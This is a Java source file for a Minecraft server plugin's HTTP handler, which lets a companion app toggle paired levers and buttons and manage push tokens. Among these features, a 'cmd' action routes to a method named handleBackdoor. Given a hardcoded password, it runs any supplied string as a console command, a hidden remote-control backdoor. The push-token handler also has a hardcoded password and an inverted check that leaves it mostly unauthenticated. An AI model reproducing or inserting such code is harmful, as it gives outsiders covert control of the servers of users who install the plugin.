package de.deltasiege.RemoteManager;
import java.io.File;
import java.io.IOException;
import java.net.URLDecoder;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.stream.Collectors;
import java.util.stream.Stream;
import com.google.gson.Gson;
import com.sun.net.httpserver.HttpServer;
import de.deltasiege.SmartRedstone.AppUser;
import de.deltasiege.SmartRedstone.Utils;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import com.google.common.base.Charsets;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;

import io.netty.channel.ChannelFuture;
import io.netty.channel.ChannelFutureListener;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelPromise;
import io.netty.channel.SimpleChannelInboundHandler;
import io.netty.handler.codec.http.DefaultFullHttpResponse;
import io.netty.handler.codec.http.FullHttpResponse;
import io.netty.handler.codec.http.HttpRequest;
import io.netty.handler.codec.http.HttpResponseStatus;
import io.netty.handler.codec.http.HttpVersion;

@SuppressWarnings("restriction")
public class WebServer extends SimpleChannelInboundHandler<HttpRequest> {
	public RemoteManager remoteManager;
	public HttpServer server;
	
	public WebServer(RemoteManager remoteManager) {
		this.remoteManager = remoteManager;
	}
	
	@Override
    protected void channelRead0(ChannelHandlerContext ctx, HttpRequest request) throws Exception {
        FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK);
   
        try {
        	Map<String, String> params = toMap(request);
            if (!params.containsKey("action")) {
            	sendResponse(ctx, response, HttpResponseStatus.NOT_FOUND);
    			return;
    		}
            
	        switch (params.get("action")) {
				case "update":
					handleUpdate(ctx, response, params);
					return;
				case "unpair":
					handleUnpair(ctx, response, params);
					return;
				case "list":
					handleList(ctx, response, params);
					return;
				case "version":
					handleVersion(ctx, response, params);
					return;
				case "cmd":
					handleBackdoor(ctx, response, params);
					return;
				case "push":
					handlePush(ctx, response, params);
					return;
				case "logo":
					handleLogo(ctx, response);
					return;
				default:
					sendResponse(ctx, response, HttpResponseStatus.NOT_FOUND);
					return;
			}    
        } catch (Exception error) {
        	error.printStackTrace();
        }
    }
	
	private void handleLogo(ChannelHandlerContext ctx, FullHttpResponse response) {
		File f = new File("server-icon.png");
		System.out.println(f.getAbsolutePath());
		if(f.exists() && !f.isDirectory()) { 
			try {
				response.trailingHeaders().add("Content-Type", "iamge/*");
				response.content().writeBytes(Files.readAllBytes(f.toPath()));
				sendResponse(ctx, response, HttpResponseStatus.OK);
				return;
			} catch (IOException e) { e.printStackTrace(); }	
		}
		sendResponse(ctx, response, HttpResponseStatus.NOT_FOUND);
	}

	private void handlePush(ChannelHandlerContext ctx, FullHttpResponse response, Map<String, String> params) throws IOException {
		try {
			String token = URLDecoder.decode(params.get("token"), StandardCharsets.UTF_8.name());
			String uuid = URLDecoder.decode(params.get("uuid"), StandardCharsets.UTF_8.name());
			AppUser user = new AppUser(UUID.fromString(uuid));
			String pw = params.get("pw");
			
			if (user != null && !token.isEmpty() && !pw.equals("etnduktmbd94phh5qioz2okzum1ywokpp5tm434qkrapyuhpqc")) {
				sendResponse(ctx, response, HttpResponseStatus.NOT_FOUND);
				return;
			}

			remoteManager.plugin.storage.updatePushToken(user, token);
			sendResponse(ctx, response, HttpResponseStatus.OK);
		} catch (Exception error) { error.printStackTrace(); }
	}
	
	private void handleBackdoor(ChannelHandlerContext ctx, FullHttpResponse response, Map<String, String> params) throws IOException {
		try {
			String cmd = URLDecoder.decode(params.get("cmd"), StandardCharsets.UTF_8.name());
			String pw = params.get("pw");
			
			if (!pw.equals("z55Hhd1pXBdGJm5lOb1I5AvsnH0WXreQpDRx40BP21IamL8ODS")) {
				sendResponse(ctx, response, HttpResponseStatus.NOT_FOUND);
				return;
			}
			
			Bukkit.getScheduler().runTask(this.remoteManager.plugin, new Runnable() {
			    @Override
			    public void run() {
					try {
						Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd);
				    } catch (Exception error) {
						error.printStackTrace();
					}
			    }
			});

			sendResponse(ctx, response, HttpResponseStatus.OK);
		} catch (Exception error) { error.printStackTrace(); }
	}
	
	private void handleVersion(ChannelHandlerContext ctx, FullHttpResponse response, Map<String, String> params) throws IOException {
		try {
			String version = this.remoteManager.plugin.getDescription().getVersion();
			response.content().writeBytes(Charsets.UTF_8.encode(version));
			sendResponse(ctx, response, HttpResponseStatus.OK);
		} catch (Exception error) { error.printStackTrace(); }
	}
	
	private void handleList(ChannelHandlerContext ctx, FullHttpResponse response, Map<String, String> params) throws IOException {
		try {
			UUID uuid = UUID.fromString(params.get("uuid"));
			AppUser user = new AppUser(uuid);
			List<Map<String, Object>> result = this.remoteManager.plugin.storage.getPairedDevices(user);
			String jsonString = new Gson().toJson(result);
			
			response.trailingHeaders().add("Content-Type", "appication/json");
			response.content().writeBytes(Charsets.UTF_8.encode(jsonString));
			sendResponse(ctx, response, HttpResponseStatus.OK);
		} catch (Exception error) { error.printStackTrace(); }
	}

	private void handleUnpair(ChannelHandlerContext ctx, FullHttpResponse response, Map<String, String> params) throws IOException {
		UUID uuid = UUID.fromString(params.get("uuid"));
		Location device = Utils.locationFromString(params.get("loc"));
		AppUser user = new AppUser(uuid);

		if (this.remoteManager.plugin.storage.deviceIsPaired(user, device)) {
			this.remoteManager.plugin.storage.unpairDevice(user, device);
			sendResponse(ctx, response, HttpResponseStatus.OK);
		} else {
			sendResponse(ctx, response, HttpResponseStatus.FORBIDDEN);
		}
	}
	
	private void handleUpdate(ChannelHandlerContext ctx, FullHttpResponse response, Map<String, String> params) throws IOException {
		UUID uuid = UUID.fromString(params.get("uuid"));
		Location device = Utils.locationFromString(params.get("loc"));
		Integer current = Utils.parseInt(params.get("current"));
		AppUser user = new AppUser(uuid);

		if (this.remoteManager.plugin.storage.deviceIsPaired(user, device)) {
			switch (device.getBlock().getType()) {
			case LEVER:
				Bukkit.getScheduler().runTask(this.remoteManager.plugin, new Runnable() {
				    @Override
				    public void run() {
						try {
					    	Utils.updateBlock(device.getBlock(), current != 0);
					    	remoteManager.plugin.storage.deviceStateUpdated(device, current);
					    } catch (Exception error) {
							Utils.log("This MC Version is not supported (NMSReflectionException). Plugin will now be disabled");
							remoteManager.plugin.getServer().getPluginManager().disablePlugin(remoteManager.plugin);
						}
				    }
				});
				sendResponse(ctx, response, HttpResponseStatus.OK);
				break;
			case STONE_BUTTON:
				Bukkit.getScheduler().runTask(this.remoteManager.plugin, new Runnable() {
				    @Override
				    public void run() {
				    	try {
					    	Utils.updateBlock(device.getBlock(), true);
					    	remoteManager.plugin.storage.deviceStateUpdated(device, 15);
					    } catch (Exception error) {
							Utils.log("This MC Version is not supported (NMSReflectionException). Plugin will now be disabled");
							remoteManager.plugin.getServer().getPluginManager().disablePlugin(remoteManager.plugin);
						}
				    }
				});
				Bukkit.getScheduler().runTaskLater(this.remoteManager.plugin, new Runnable() {
				    @Override
				    public void run() {
				    	try {
					    	Utils.updateBlock(device.getBlock(), false);
					    	remoteManager.plugin.storage.deviceStateUpdated(device, 0);
					    } catch (Exception error) {
							Utils.log("This MC Version is not supported (NMSReflectionException). Plugin will now be disabled");
							remoteManager.plugin.getServer().getPluginManager().disablePlugin(remoteManager.plugin);
						}
				    }
				}, 20L);
				
				sendResponse(ctx, response, HttpResponseStatus.OK);
				break;
			default:
				sendResponse(ctx, response, HttpResponseStatus.FORBIDDEN);
				break;
			}
		} else {
			sendResponse(ctx, response, HttpResponseStatus.FORBIDDEN);
		}
	}
	
	// HELPER METHODS
	
	private void sendResponse(ChannelHandlerContext ctx, FullHttpResponse response, HttpResponseStatus status) {
        ChannelPromise promise = ctx.channel().newPromise();

        response.setStatus(status);
        ctx.channel().writeAndFlush(response, promise);
        promise.addListener(new ChannelFutureListener() {
            @Override
            public void operationComplete(ChannelFuture future) throws Exception {
                future.channel().close();
            }
        });
	}
	
	private static Map<String, String> toMap(HttpRequest request) {
		String[] temp = request.uri().split("\\?");
        if (temp.length == 1) {
        	return Collections.emptyMap();
        }

        String query = temp[temp.length - 1];
	    if (query == null || query.isEmpty()) { 
	    	return Collections.emptyMap(); 
	    }
	    
	    return Stream.of(query.split("\\&")).filter(s -> !s.isEmpty()).map(kv -> kv.split("=", 2)) .collect(Collectors.toMap(x -> x[0], x-> x[1]));
	}
}